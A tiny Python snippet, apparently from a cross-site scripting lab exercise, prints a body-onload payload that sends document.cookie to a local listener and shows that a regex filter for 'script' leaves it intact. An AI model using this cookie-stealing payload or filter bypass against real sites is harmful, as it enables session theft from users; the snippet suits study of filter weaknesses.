import re

comment = '<body onload=document.open("http://127.0.0.1:1338/xss/high?cookie=" + document.cookie)>'
print(comment)
comment = re.sub(r'<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t', '', comment, flags=re.IGNORECASE)
print(comment)
